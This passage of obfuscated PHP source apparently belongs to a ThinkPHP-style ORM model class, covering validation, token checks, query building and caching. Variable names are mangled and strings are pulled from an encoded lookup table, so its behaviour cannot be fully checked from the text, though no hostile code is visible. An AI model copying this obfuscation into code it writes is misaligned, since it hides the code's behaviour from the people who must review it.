!1; } $×é’õ°£ = $this->parseFieldsMap($×é’õ°£, 0); $³ãßº…š = $³ãßº…š ? $³ãßº…š : (!empty($×é’õ°£[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÊñÊ¸½Ò[353]])) { $œÀÕÎ·” = $this->options[$ÊñÊ¸½Ò[353]]; unset($this->options[$ÊñÊ¸½Ò[353]]); } elseif ($³ãßº…š == THINK_MODEL_INSERT && isset($this->insertFields)) { $œÀÕÎ·” = $this->insertFields; } elseif ($³ãßº…š == THINK_MODEL_UPDATE && isset($this->updateFields)) { $œÀÕÎ·” = $this->updateFields; } if (isset($œÀÕÎ·”)) { if (is_string($œÀÕÎ·”)) { $œÀÕÎ·” = explode($ÊñÊ¸½Ò[50], $œÀÕÎ·”); } if (think_config($ÊñÊ¸½Ò[376])) { $œÀÕÎ·”[] = think_config($ÊñÊ¸½Ò[377]); } foreach ($×é’õ°£ as $¾™±İÈ‰ => $÷¬†) { if (!in_array($¾™±İÈ‰, $œÀÕÎ·”)) { unset($×é’õ°£[$¾™±İÈ‰]); } } } if (!$this->autoValidation($×é’õ°£, $³ãßº…š)) { return !1; } if (!$this->autoCheckToken($×é’õ°£)) { $this->error = think_lang($ÊñÊ¸½Ò[378]); return !1; } if ($this->autoCheckFields) { $œÀÕÎ·” = $this->getDbFields(); foreach ($×é’õ°£ as $¾™±İÈ‰ => $÷¬†) { if (!in_array($¾™±İÈ‰, $œÀÕÎ·”)) { unset($×é’õ°£[$¾™±İÈ‰]); } elseif (MAGIC_QUOTES_GPC && is_string($÷¬†)) { $×é’õ°£[$¾™±İÈ‰] = stripslashes($÷¬†); } } } $this->autoOperation($×é’õ°£, $³ãßº…š); $this->data = $×é’õ°£; return $×é’õ°£; } public function autoCheckToken($ÏªŸŠ¤) { $á™ç±Úà =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($this->options[$á™ç±Úà[379]]) && !$this->options[$á™ç±Úà[379]]) { return !0; } if (think_config($á™ç±Úà[376])) { $Ùº©ö±  = think_config($á™ç±Úà[377]); if (!isset($ÏªŸŠ¤[$Ùº©ö± ]) || Session::get($Ùº©ö± )) { return !1; } list($”´ÚœÀÃ, $•áÁ„Óà) = explode($á™ç±Úà[11], $ÏªŸŠ¤[$Ùº©ö± ]); if ($•áÁ„Óà && Session::get($Ùº©ö±  . $á™ç±Úà[10] . $”´ÚœÀÃ) === $•áÁ„Óà) { Session::remove($Ùº©ö±  . $á™ç±Úà[10] . $”´ÚœÀÃ); return !0; } if (think_config($á™ç±Úà[380])) { Session::remove($Ùº©ö±  . $á™ç±Úà[10] . $”´ÚœÀÃ); } return !1; } return !0; } public function regex($óÎòİÁµ, $à…‘‘Ş) { $£­ö…°º =& $_SERVER[ˆö¿ÚÌ¼]; $œËÓ§ë´ = array($£­ö…°º[381] => $£­ö…°º[382], $£­ö…°º[383] => $£­ö…°º[384], $£­ö…°º[385] => $£­ö…°º[386], $£­ö…°º[387] => $£­ö…°º[388], $£­ö…°º[389] => $£­ö…°º[390], $£­ö…°º[391] => $£­ö…°º[392], $£­ö…°º[393] => $£­ö…°º[394], $£­ö…°º[368] => $£­ö…°º[395], $£­ö…°º[396] => $£­ö…°º[397]); if (isset($œËÓ§ë´[strtolower($à…‘‘Ş)])) { $à…‘‘Ş = $œËÓ§ë´[strtolower($à…‘‘Ş)]; } return preg_match($à…‘‘Ş, $óÎòİÁµ) === 1; } private function autoOperation(&$ÃÛ’îĞ, $ÜûëÚÈ) { $ÉÁ¾êÚ =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($this->options[$ÉÁ¾êÚ[398]])) { $÷õšßï = $this->options[$ÉÁ¾êÚ[398]]; unset($this->options[$ÉÁ¾êÚ[398]]); } elseif (!empty($this->_auto)) { $÷õšßï = $this->_auto; } if (isset($÷õšßï)) { foreach ($÷õšßï as $Á†›–Œ) { if (empty($Á†›–Œ[2])) { $Á†›–Œ[2] = THINK_MODEL_INSERT; } if ($ÜûëÚÈ == $Á†›–Œ[2] || $Á†›–Œ[2] == THINK_MODEL_BOTH) { switch (trim($Á†›–Œ[3])) { case $ÉÁ¾êÚ[399]: case $ÉÁ¾êÚ[400]: $ôƒúÃ œ = isset($Á†›–Œ[4]) ? (array) $Á†›–Œ[4] : array(); if (isset($ÃÛ’îĞ[$Á†›–Œ[0]])) { array_unshift($ôƒúÃ œ, $ÃÛ’îĞ[$Á†›–Œ[0]]); } if ($ÉÁ¾êÚ[399] == $Á†›–Œ[3]) { $ÃÛ’îĞ[$Á†›–Œ[0]] = call_user_func_array($Á†›–Œ[1], $ôƒúÃ œ); } else { $ÃÛ’îĞ[$Á†›–Œ[0]] = call_user_func_array(array(&$this, $Á†›–Œ[1]), $ôƒúÃ œ); } break; case $ÉÁ¾êÚ[353]: $ÃÛ’îĞ[$Á†›–Œ[0]] = $ÃÛ’îĞ[$Á†›–Œ[1]]; break; case $ÉÁ¾êÚ[401]: if ($ÉÁ¾êÚ[12] === $ÃÛ’îĞ[$Á†›–Œ[0]]) { unset($ÃÛ’îĞ[$Á†›–Œ[0]]); } break; case $ÉÁ¾êÚ[402]: default: $ÃÛ’îĞ[$Á†›–Œ[0]] = $Á†›–Œ[1]; } if (!1 === $ÃÛ’îĞ[$Á†›–Œ[0]]) { unset($ÃÛ’îĞ[$Á†›–Œ[0]]); } } } } return $ÃÛ’îĞ; } protected function autoValidation($¼èªŠğ˜, $ç£ôò€¥) { $Ÿ¶ŞÛÂ¯ =& $_SERVER[ˆö¿ÚÌ¼]; if (!empty($this->options[$Ÿ¶ŞÛÂ¯[403]])) { $™…§ˆØ¹ = $this->options[$Ÿ¶ŞÛÂ¯[403]]; unset($this->options[$Ÿ¶ŞÛÂ¯[403]]); } elseif (!empty($this->_validate)) { $™…§ˆØ¹ = $this->_validate; } if (isset($™…§ˆØ¹)) { if ($this->patchValidate) { $this->error = array(); } foreach ($™…§ˆØ¹ as $ûçÎ¡ù‰ => $¦Ü×êùŞ) { if (empty($¦Ü×êùŞ[5]) || $¦Ü×êùŞ[5] == THINK_MODEL_BOTH || $¦Ü×êùŞ[5] == $ç£ôò€¥) { if (0 == strpos($¦Ü×êùŞ[2], $Ÿ¶ŞÛÂ¯[404]) && strpos($¦Ü×êùŞ[2], $Ÿ¶ŞÛÂ¯[405])) { $¦Ü×êùŞ[2] = think_lang(substr($¦Ü×êùŞ[2], 2, -1)); } $¦Ü×êùŞ[3] = isset($¦Ü×êùŞ[3]) ? $¦Ü×êùŞ[3] : THINK_EXISTS_VALIDATE; $¦Ü×êùŞ[4] = isset($¦Ü×êùŞ[4]) ? $¦Ü×êùŞ[4] : $Ÿ¶ŞÛÂ¯[406]; switch ($¦Ü×êùŞ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¼èªŠğ˜, $¦Ü×êùŞ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ÿ¶ŞÛÂ¯[12] != trim($¼èªŠğ˜[$¦Ü×êùŞ[0]])) { if (!1 === $this->_validationField($¼èªŠğ˜, $¦Ü×êùŞ)) { return !1; } } break; default: if (isset($¼èªŠğ˜[$¦Ü×êùŞ[0]])) { if (!1 === $this->_validationField($¼èªŠğ˜, $¦Ü×êùŞ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ûûÁçÍÍ, $‡ËåÛ×ù) { if (!1 === $this->_validationFieldItem($ûûÁçÍÍ, $‡ËåÛ×ù)) { if ($this->patchValidate) { $this->error[$‡ËåÛ×ù[0]] = $‡ËåÛ×ù[2]; } else { $this->error = $‡ËåÛ×ù[2]; return !1; } } return; } protected function _validationFieldItem($Ğû‘¥ğã, $ñ³‡‰ö…) { $…ìÅÜ±Î =& $_SERVER[ˆö¿ÚÌ¼]; switch (strtolower(trim($ñ³‡‰ö…[4]))) { case $…ìÅÜ±Î[399]: case $…ìÅÜ±Î[400]: $¢ÏÆáşê = isset($ñ³‡‰ö…[6]) ? (array) $ñ³‡‰ö…[6] : array(); if (is_string($ñ³‡‰ö…[0]) && strpos($ñ³‡‰ö…[0], $…ìÅÜ±Î[50])) { $ñ³‡‰ö…[0] = explode($…ìÅÜ±Î[50], $ñ³‡‰ö…[0]); } if (is_array($ñ³‡‰ö…[0])) { foreach ($ñ³‡‰ö…[0] as $‰öÆ¦º) { $Ë¼öÍ¹[$‰öÆ¦º] = $Ğû‘¥ğã[$‰öÆ¦º]; } array_unshift($¢ÏÆáşê, $Ë¼öÍ¹); } else { array_unshift($¢ÏÆáşê, $Ğû‘¥ğã[$ñ³‡‰ö…[0]]); } if ($…ìÅÜ±Î[399] == $ñ³‡‰ö…[4]) { return call_user_func_array($ñ³‡‰ö…[1], $¢ÏÆáşê); } else { return call_user_func_array(array(&$this, $ñ³‡‰ö…[1]), $¢ÏÆáşê); } case $…ìÅÜ±Î[407]: return $Ğû‘¥ğã[$ñ³‡‰ö…[0]] == $Ğû‘¥ğã[$ñ³‡‰ö…[1]]; case $…ìÅÜ±Î[408]: if (is_string($ñ³‡‰ö…[0]) && strpos($ñ³‡‰ö…[0], $…ìÅÜ±Î[50])) { $ñ³‡‰ö…[0] = explode($…ìÅÜ±Î[50], $ñ³‡‰ö…[0]); } $Æç–Œ™ = array(); if (is_array($ñ³‡‰ö…[0])) { foreach ($ñ³‡‰ö…[0] as $‰öÆ¦º) { $Æç–Œ™[$‰öÆ¦º] = $Ğû‘¥ğã[$‰öÆ¦º]; } } else { $Æç–Œ™[$ñ³‡‰ö…[0]] = $Ğû‘¥ğã[$ñ³‡‰ö…[0]]; } if (!empty($Ğû‘¥ğã[$this->getPk()])) { $Æç–Œ™[$this->getPk()] = array($…ìÅÜ±Î[409], $Ğû‘¥ğã[$this->getPk()]); } if ($this->where($Æç–Œ™)->find()) { return !1; } return !0; default: return $this->check($Ğû‘¥ğã[$ñ³‡‰ö…[0]], $ñ³‡‰ö…[1], $ñ³‡‰ö…[4]); } } public function check($¢öáö·˜, $Ä¯Ë½ò¬, $ì·¦×İ§ = "\162\145\x67\x65\x78") { $ó´º¡€Ñ =& $_SERVER[ˆö¿ÚÌ¼]; $ì·¦×İ§ = strtolower(trim($ì·¦×İ§)); switch ($ì·¦×İ§) { case $ó´º¡€Ñ[7]: case $ó´º¡€Ñ[410]: $ºšÅŒ‚ƒ = is_array($Ä¯Ë½ò¬) ? $Ä¯Ë½ò¬ : explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬); return $ì·¦×İ§ == $ó´º¡€Ñ[7] ? in_array($¢öáö·˜, $ºšÅŒ‚ƒ) : !in_array($¢öáö·˜, $ºšÅŒ‚ƒ); case $ó´º¡€Ñ[411]: case $ó´º¡€Ñ[412]: if (is_array($Ä¯Ë½ò¬)) { $½’éñ…¶ = $Ä¯Ë½ò¬[0]; $¬°É¶Ş¦ = $Ä¯Ë½ò¬[1]; } else { list($½’éñ…¶, $¬°É¶Ş¦) = explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬); } return $ì·¦×İ§ == $ó´º¡€Ñ[411] ? $¢öáö·˜ >= $½’éñ…¶ && $¢öáö·˜ <= $¬°É¶Ş¦ : $¢öáö·˜ < $½’éñ…¶ || $¢öáö·˜ > $¬°É¶Ş¦; case $ó´º¡€Ñ[413]: case $ó´º¡€Ñ[414]: return $ì·¦×İ§ == $ó´º¡€Ñ[413] ? $¢öáö·˜ == $Ä¯Ë½ò¬ : $¢öáö·˜ != $Ä¯Ë½ò¬; case $ó´º¡€Ñ[415]: $“¨Õ¹¤Ğ = mb_strlen($¢öáö·˜, $ó´º¡€Ñ[416]); if (strpos($Ä¯Ë½ò¬, $ó´º¡€Ñ[50])) { list($½’éñ…¶, $¬°É¶Ş¦) = explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬); return $“¨Õ¹¤Ğ >= $½’éñ…¶ && $“¨Õ¹¤Ğ <= $¬°É¶Ş¦; } else { return $“¨Õ¹¤Ğ == $Ä¯Ë½ò¬; } case $ó´º¡€Ñ[417]: list($õÔ­æ÷ü, $Ç¬®¡ãê) = explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬); if (!is_numeric($õÔ­æ÷ü)) { $õÔ­æ÷ü = strtotime($õÔ­æ÷ü); } if (!is_numeric($Ç¬®¡ãê)) { $Ç¬®¡ãê = strtotime($Ç¬®¡ãê); } return NOW_TIME >= $õÔ­æ÷ü && NOW_TIME <= $Ç¬®¡ãê; case $ó´º¡€Ñ[418]: return in_array(get_client_ip(), explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬)); case $ó´º¡€Ñ[419]: return !in_array(get_client_ip(), explode($ó´º¡€Ñ[50], $Ä¯Ë½ò¬)); case $ó´º¡€Ñ[406]: default: return $this->regex($¢öáö·˜, $Ä¯Ë½ò¬); } } public function query($Œ¿¢‹’•, $ê•áÁÌó = false) { $ƒŠ¼Şœ¿ =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_bool($ê•áÁÌó) && !is_array($ê•áÁÌó)) { $ê•áÁÌó = func_get_args(); array_shift($ê•áÁÌó); } $Œ¿¢‹’• = str_replace(array($ƒŠ¼Şœ¿[288], $ƒŠ¼Şœ¿[420]), $ƒŠ¼Şœ¿[53], $Œ¿¢‹’•); $Œ¿¢‹’• = $this->parseSql($Œ¿¢‹’•, $ê•áÁÌó); return $this->db->query($Œ¿¢‹’•); } public function execute($‡ì£Çñ, $Ëò¾¥ãî = false) { if (!is_bool($Ëò¾¥ãî) && !is_array($Ëò¾¥ãî)) { $Ëò¾¥ãî = func_get_args(); array_shift($Ëò¾¥ãî); } $‡ì£Çñ = $this->parseSql($‡ì£Çñ, $Ëò¾¥ãî); return $this->db->execute($‡ì£Çñ); } protected function parseSql($“àÄ™â¦, $·–àŠ¯Ë) { $ĞÍÏÑ«Ä =& $_SERVER[ˆö¿ÚÌ¼]; if (!0 === $·–àŠ¯Ë) { $ø éÔìú = $this->_parseOptions(); $“àÄ™â¦ = $this->db->parseSql($“àÄ™â¦, $ø éÔìú); } elseif (is_array($·–àŠ¯Ë)) { $·–àŠ¯Ë = array_map(array($this->db, $ĞÍÏÑ«Ä[421]), $·–àŠ¯Ë); $“àÄ™â¦ = vsprintf($“àÄ™â¦, $·–àŠ¯Ë); } else { $“àÄ™â¦ = strtr($“àÄ™â¦, array($ĞÍÏÑ«Ä[422] => $this->getTableName(), $ĞÍÏÑ«Ä[423] => think_config($ĞÍÏÑ«Ä[324]))); } $this->db->setModel($this->name); return $“àÄ™â¦; } public function db($ÅâÀïõì = '', $Á†éÕ¬ë = '', $´ş¢ã„¾ = array()) { $¢×¤¯ÚÇ =& $_SERVER[ˆö¿ÚÌ¼]; if ($¢×¤¯ÚÇ[12] === $ÅâÀïõì && $this->db) { return $this->db; } static $şÁ¯¬è = array(); static $æ°ä…¨ = array(); if (!isset($æ°ä…¨[$ÅâÀïõì]) || isset($æ°ä…¨[$ÅâÀïõì]) && $Á†éÕ¬ë && $şÁ¯¬è[$ÅâÀïõì] != $Á†éÕ¬ë) { if (!empty($Á†éÕ¬ë) && is_string($Á†éÕ¬ë) && !1 === strpos($Á†éÕ¬ë, $¢×¤¯ÚÇ[8])) { $Á†éÕ¬ë = think_config($Á†éÕ¬ë); } $ÅâÀïõì = think_guid($Á†éÕ¬ë); $æ°ä…¨[$ÅâÀïõì] = Db::getInstance($Á†éÕ¬ë); } elseif (NULL === $Á†éÕ¬ë) { $æ°ä…¨[$ÅâÀïõì]->close(); unset($æ°ä…¨[$ÅâÀïõì]); return; } if (!empty($´ş¢ã„¾)) { if (is_string($´ş¢ã„¾)) { parse_str($´ş¢ã„¾, $´ş¢ã„¾); } foreach ($´ş¢ã„¾ as $õ›Éé‚Ö => $ïòÂÜ¬­) { $this->setProperty($õ›Éé‚Ö, $ïòÂÜ¬­); } } $şÁ¯¬è[$ÅâÀïõì] = $Á†éÕ¬ë; $this->db = $æ°ä…¨[$ÅâÀïõì]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‡ÑÇí = get_class($this); if ($‡ÑÇí == $_SERVER[ˆö¿ÚÌ¼][424]) { return $this->name; } $this->name = substr($‡ÑÇí, 0, -5); } return $this->name; } public function getTableName() { $„’–ÌŸš =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($this->trueTableName)) { $¢ş­Œ®¤ = !empty($this->tablePrefix) ? $this->tablePrefix : $„’–ÌŸš[12]; if (!empty($this->tableName)) { $¢ş­Œ®¤ .= $this->tableName; } else { $¢ş­Œ®¤ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¢ş­Œ®¤); } return (!empty($this->dbName) ? $this->dbName . $„’–ÌŸš[10] : $„’–ÌŸš[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $‰“’ íÕ =& $_SERVER[ˆö¿ÚÌ¼]; return isset($this->fields[$‰“’ íÕ[331]]) ? $this->fields[$‰“’ íÕ[331]] : $this->pk; } public function getDbFields() { $âùí‚ıÔ =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($this->options[$âùí‚ıÔ[359]])) { $ç²ˆ“ïÖ = $this->db->getFields($this->options[$âùí‚ıÔ[359]]); return $ç²ˆ“ïÖ ? array_keys($ç²ˆ“ïÖ) : !1; } if ($this->fields) { $ç²ˆ“ïÖ = $this->fields; unset($ç²ˆ“ïÖ[$âùí‚ıÔ[330]], $ç²ˆ“ïÖ[$âùí‚ıÔ[331]], $ç²ˆ“ïÖ[$âùí‚ıÔ[332]], $ç²ˆ“ïÖ[$âùí‚ıÔ[329]]); return $ç²ˆ“ïÖ; } return !1; } public function data($Õ»¥ÈÂÈ = '') { $ûÍ­Ë¯ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ûÍ­Ë¯[12] === $Õ»¥ÈÂÈ && !empty($this->data)) { return $this->data; } if (is_object($Õ»¥ÈÂÈ)) { $Õ»¥ÈÂÈ = get_object_vars($Õ»¥ÈÂÈ); } elseif (is_string($Õ»¥ÈÂÈ)) { parse_str($Õ»¥ÈÂÈ, $Õ»¥ÈÂÈ); } elseif (!is_array($Õ»¥ÈÂÈ)) { think_exception(think_lang($ûÍ­Ë¯[351])); } $this->data = $Õ»¥ÈÂÈ; return $this; } public function join($èùàÌúï) { $à æŞØŒ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_array($èùàÌúï)) { $this->options[$à æŞØŒ[362]] = $èùàÌúï; } elseif (!empty($èùàÌúï)) { $this->options[$à æŞØŒ[362]][] = $èùàÌúï; } return $this; } public function union($²ËÎê¯˜, $·öÎ»ÜÜ = false) { $°ÈŒÉ›  =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($²ËÎê¯˜)) { return $this; } if ($·öÎ»ÜÜ) { $this->options[$°ÈŒÉ› [425]][$°ÈŒÉ› [426]] = !0; } if (is_object($²ËÎê¯˜)) { $²ËÎê¯˜ = get_object_vars($²ËÎê¯˜); } if (is_string($²ËÎê¯˜)) { $Ÿçİ‹¨ = $²ËÎê¯˜; } elseif (is_array($²ËÎê¯˜)) { if (isset($²ËÎê¯˜[0])) { $this->options[$°ÈŒÉ› [425]] = array_merge($this->options[$°ÈŒÉ› [425]], $²ËÎê¯˜); return $this; } else { $Ÿçİ‹¨ = $²ËÎê¯˜; } } else { think_exception(think_lang($°ÈŒÉ› [351])); } $this->options[$°ÈŒÉ› [425]][] = $Ÿçİ‹¨; return $this; } public function cache($ïÒØ¾¨… = true, $Œª³òÁ = null, $Éµõş÷ = '') { $Äæâªûğ =& $_SERVER[ˆö¿ÚÌ¼]; if (!1 !== $ïÒØ¾¨…) { $this->options[$Äæâªûğ[427]] = array($Äæâªûğ[97] => $ïÒØ¾¨…, $Äæâªûğ[417] => $Œª³òÁ, $Äæâªûğ[33] => $Éµõş÷); } return $this; } public function field($å‰‰Ş²Â, $ãú³®ï÷ = false) { $…­Şàà® =& $_SERVER[ˆö¿ÚÌ¼]; if (!0 === $å‰‰Ş²Â) { $¤°‰‰­ = $this->getDbFields(); $å‰‰Ş²Â = $¤°‰‰­ ? $¤°‰‰­ : $…­Şàà®[223]; } elseif ($ãú³®ï÷) { if (is_string($å‰‰Ş²Â)) { $å‰‰Ş²Â = explode($…­Şàà®[50], $å‰‰Ş²Â); } $¤°‰‰­ = $this->getDbFields(); $å‰‰Ş²Â = $¤°‰‰­ ? array_diff($¤°‰‰­, $å‰‰Ş²Â) : $å‰‰Ş²Â; } $this->options[$…­Şàà®[353]] = $å‰‰Ş²Â; return $this; } public function scope($§Ş…åˆ = '', $åÄİõûÌ = NULL) { $¸øÓÖÖĞ =& $_SERVER[ˆö¿ÚÌ¼]; if ($¸øÓÖÖĞ[12] === $§Ş…åˆ) { if (isset($this->_scope[$¸øÓÖÖĞ[37]])) { $ß÷İ¹²– = $this->_scope[$¸øÓÖÖĞ[37]]; } else { return $this; } } elseif (is_string($§Ş…åˆ)) { $èÅÑ²óŒ = explode($¸øÓÖÖĞ[50], $§Ş…åˆ); $ß÷İ¹²– = array(); foreach ($èÅÑ²óŒ as $¾ÉæÌà) { if (!isset($this->_scope[$¾ÉæÌà])) { continue; } $ß÷İ¹²– = array_merge($ß÷İ¹²–, $this->_scope[$¾ÉæÌà]); } if (!empty($åÄİõûÌ) && is_array($åÄİõûÌ)) { $ß÷İ¹²– = array_merge($ß÷İ¹²–, $åÄİõûÌ); } } elseif (is_array($§Ş…åˆ)) { $ß÷İ¹²– = $§Ş…åˆ; } if (is_array($ß÷İ¹²–) && !empty($ß÷İ¹²–)) { $this->options = array_merge($this->options, array_change_key_case($ß÷İ¹²–)); } return $this; } public function where($¬ıÔ¡ê, $™´ÍÁ¼… = null) { $”ùüğÇÙ =& $_SERVER[ˆö¿ÚÌ¼]; if (!is_null($™´ÍÁ¼…) && is_string($¬ıÔ¡ê)) { if (!is_array($™´ÍÁ¼…)) { $™´ÍÁ¼… = func_get_args(); array_shift($™´ÍÁ¼…); } $™´ÍÁ¼… = array_map(array($this->db, $”ùüğÇÙ[421]), $™´ÍÁ¼…); $¬ıÔ¡ê = vsprintf($¬ıÔ¡ê, $™´ÍÁ¼…); } elseif (is_object($¬ıÔ¡ê)) { $¬ıÔ¡ê = get_object_vars($¬ıÔ¡ê); } elseif (is_array($¬ıÔ¡ê)) { foreach ($¬ıÔ¡ê as $İ…‘ÎÍù => $õ¢ºÏÀ¥) { if ((is_numeric($İ…‘ÎÍù) || !$İ…‘ÎÍù) && is_string($õ¢ºÏÀ¥)) { if (strpos($õ¢ºÏÀ¥, $”ùüğÇÙ[428]) === 0) { continue; } think_trace($”ùüğÇÙ[429], $”ùüğÇÙ[12], $”ùüğÇÙ[49]); die; } } } if (is_string($¬ıÔ¡ê) && $”ùüğÇÙ[12] != $¬ıÔ¡ê) { $Œ¢şĞŠª = array(); $Œ¢şĞŠª[$”ùüğÇÙ[430]] = $¬ıÔ¡ê; $¬ıÔ¡ê = $Œ¢şĞŠª; } if (isset($this->options[$”ùüğÇÙ[355]])) { $this->options[$”ùüğÇÙ[355]] = array_merge($this->options[$”ùüğÇÙ[355]], $¬ıÔ¡ê); } else { $this->options[$”ùüğÇÙ[355]] = $¬ıÔ¡ê; } return $this; } public function limit($áÆé¾ÛØ, $ŞñàöÓå = null) { $ÜêÅ¾¨Ù =& $_SERVER[ˆö¿ÚÌ¼]; $this->options[$ÜêÅ¾¨Ù[370]] = is_null($ŞñàöÓå) ? $áÆé¾ÛØ : $áÆé¾ÛØ . $ÜêÅ¾¨Ù[50] . $ŞñàöÓå; return $this; } public function page($‘ùéÏúÕ, $ÄÊè‘¨— = null) { $×ÆÊŒìÍ =& $_SERVER[ˆö¿ÚÌ¼]; $this->options[$×ÆÊŒìÍ[431]] = is_null($ÄÊè‘¨—) ? $‘ùéÏúÕ : $‘ùéÏúÕ . $×ÆÊŒìÍ[50] . $ÄÊè‘¨—; return $this; } public function comment($„¶óÚÀ·) { $this->options[$_SERVER[ˆö¿ÚÌ¼][432]] = $„¶óÚÀ·; return $this; } public function setProperty($†èô§ä, $ííÁ¨àä) { if (property_exists($this, $†èô§ä)) { $this->{$†èô§ä} = $ííÁ¨àä; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\x54\151\x6d\x65", "\x74\151\155\145", "\151\156\163\145\162\164\54\x75\160\x64\x61\x74\145", "\146\x75\x6e\x63\164\151\157\x6e"), array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\145", "\x74\151\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\156\143\164\151\157\x6e")); public function setDataAuto($ì×·ì½©) { $this->dataAuto = $ì×·ì½©; } public function __construct($î±Òı½ = '', $À…«Á†ı = '', $õúĞœñ = '') { parent::__construct($î±Òı½, $À…«Á†ı, $õúĞœñ); } protected $tableMeta = array(); protected function _beforeInsert(&$»ùÄ°ş, $—×¢€èš) { $Ÿ¶û¾ü =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->checkDataAutoHas($Ÿ¶û¾ü[433])) { return; } $this->dataBeforeFilter($»ùÄ°ş, $Ÿ¶û¾ü[433]); } protected function _beforeUpdate(&$’ù­³’, $œæƒû†) { $øá±û‚Â =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->checkDataAutoHas($øá±û‚Â[434])) { return; } $this->dataBeforeFilter($’ù­³’, $øá±û‚Â[434]); } protected function _afterSelect(&$¹ÁÙ´Â…, $„¡ÎÓïÜ) { if (!is_array($¹ÁÙ´Â…)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆö¿ÚÌ¼][435])) { return; } foreach ($¹ÁÙ´Â… as &$ø±ÔéÍ¦) { $this->dataAfterFilter($ø±ÔéÍ¦); } unset($ø±ÔéÍ¦); } protected function _afterFind(&$·Ôğâš, $‚Ñ¸Ñ©¡) { if (!is_array($·Ôğâš)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆö¿ÚÌ¼][435])) { return; } $this->dataAfterFilter($·Ôğâš); } public static function textEncode($Ï™Ê¤±) { if (!$Ï™Ê¤±) { return $Ï™Ê¤±; } $µ÷äÕ• = json_encode($Ï™Ê¤±); $µ÷äÕ• = preg_replace_callback($_SERVER[ˆö¿ÚÌ¼][436], function ($¬×şµéÈ) { return addslashes($¬×şµéÈ[0]); }, $µ÷äÕ•); return json_decode($µ÷äÕ•); } public static function textDecode($»€‘Œ€) { $Ğ²¤›™¾ =& $_SERVER[ˆö¿ÚÌ¼]; $¦ŒûÚœÃ = json_encode($»€‘Œ€); $¦ŒûÚœÃ = preg_replace_callback($Ğ²¤›™¾[437], function ($¸²Ú÷Ü°) { return $_SERVER[ˆö¿ÚÌ¼][100]; }, $¦ŒûÚœÃ); return json_decode($¦ŒûÚœÃ); } public function setAutoIncrement($Ñª§¨) { $ø®…ñ“ = array($this->getPk() => $Ñª§¨); $¼©Ù˜¦Â = $this->data($ø®…ñ“)->add(); if ($¼©Ù˜¦Â) { $this->delete($¼©Ù˜¦Â); } } public function getAutoIncrement() { $£ôÖëÊó = $this->getTableName(); $ŒŠô“»Á = $this->max($this->getPk()); $Äîó±îÓ = $this->query("\x73\150\x6f\x77\x20\164\141\142\154\145\40\x73\x74\x61\164\165\x73\x20\167\150\x65\x72\x65\x20\x4e\x61\155\145\75\x27{$£ôÖëÊó}\x27"); $½üõ† = $Äîó±îÓ[0][$_SERVER[ˆö¿ÚÌ¼][438]]; $¦é¸‚ë = max($ŒŠô“»Á, $½üõ†); return $¦é¸‚ë; } protected function _callBefore($­Ò¾¯î“, $ö¨‡êÓ) { return $this->cacheCallCheck($­Ò¾¯î“, $ö¨‡êÓ, !1); } protected function _callAfter($…ï¸€®‘, $­Ô˜¼€’) { return $this->cacheCallCheck($…ï¸€®‘, $­Ô˜¼€’, !0); } protected function cacheFunctionAlias($¿“ø—Ê) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($˜è½Úí, $›„áÕ, $İı—ˆ„« = false) { $¸“¢ëµó =& $_SERVER[ˆö¿ÚÌ¼]; $±Ó€ù«½ = $this->cacheFunctionAlias($›„áÕ); if (!$±Ó€ù«½) { return; } foreach ($±Ó€ù«½ as $‚Õö®ëÑ => $‹£ĞßÁ) { $ÔÈİ’…« = $‹£ĞßÁ[0]; $ùÁ§ª® = explode($¸“¢ëµó[50], $‹£ĞßÁ[1]); $„¬Óï–Ù = isset($‹£ĞßÁ[2]) ? $‹£ĞßÁ[2] : $¸“¢ëµó[12]; if ($˜è½Úí == $‚Õö®ëÑ) { return $this->cacheFunctionGet($‚Õö®ëÑ, $ÔÈİ’…«, $„¬Óï–Ù); } if ($İı—ˆ„« && in_array($˜è½Úí, $ùÁ§ª®)) { $this->cacheFunctionClear($‚Õö®ëÑ, $ÔÈİ’…«, $„¬Óï–Ù); } } } public function cacheFunctionGet($ÒŒ´»Òü, $û¤–ïÂï, $ÅŸ¬ÛÃ› = '') { $£öÁƒÇĞ = $this->cacheKeyMake($ÒŒ´»Òü, $û¤–ïÂï, $ÅŸ¬ÛÃ›); $Ù—µ®Õ¤ = Cache::get($£öÁƒÇĞ); if (!is_array($Ù—µ®Õ¤)) { $Ù—µ®Õ¤ = call_user_func_array(array($this, $ÒŒ´»Òü), array($û¤–ïÂï, !0)); Cache::set($£öÁƒÇĞ, $Ù—µ®Õ¤); } return 